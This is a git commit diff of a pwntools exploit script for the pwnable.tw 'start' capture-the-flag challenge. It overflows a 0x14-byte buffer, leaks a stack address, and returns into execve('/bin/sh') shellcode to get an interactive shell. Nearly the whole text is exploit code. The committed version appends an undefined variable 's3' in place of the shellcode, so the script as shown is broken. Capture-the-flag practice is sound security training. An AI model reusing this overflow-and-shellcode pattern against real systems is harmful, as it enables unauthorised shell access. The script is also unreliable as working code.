8c5fdd6453344874b869434a2488d1c786a6e012
lucas <ball.lucas@gmail.com>
2022-01-13 15:54:36 -0800

    solved start

--- pwnable/start/e.py
+++ pwnable/start/e.py
@@ -4,25 +4,22 @@ from pwn import *
 context.terminal = ['tmux', 'splitw', '-h']
 
 #p = remote("chall.pwnable.tw", 10000)
-shellcode = b"j\x0bX\x99RYhsh\x00\x00T[\xcd\x80"
-addr_ii = 0x080480a0
-addr_xii = 0x0804809e
-addr_eedmi = 0x08048091
-addr_mi = 0x0804808d
-addr_ret = 0x0804809c
-addr_aret = 0x08048099
-addr_ecx = 0x08048090
-addr_ecx2 = 0x08048087
+shellcode = b"j\x0bXj\x00hn/shh//bi1\xc9\x99T[\xcd\x80"
+addr_ecx = 0x08048087
 p = process("./start")
-gdb.attach(p, 'b _start')
+#gdb.attach(p, 'b _start')
 p.recv()
-#payload = shellcode + b"A"*(0x14 - len(shellcode))
 payload = b"A"*(0x14)
-payload += p32(addr_ecx2)
+payload += p32(addr_ecx)
 p.send(payload)
 x = p.recv()
-addr_stack = u32(x[0:4]) - 4
-p2 = shellcode + b"A"*(0x14 - len(shellcode))
+#print(hex(u32(x[0:4])))
+#print(hex(u32(x[4:8])))
+#print(hex(u32(x[8:12])))
+addr_stack = u32(x[0:4]) + 0x14
+p2 = b"A"*(0x14)
 p2 += p32(addr_stack)
+p2 += s3
 p.send(p2)
+
 p.interactive()
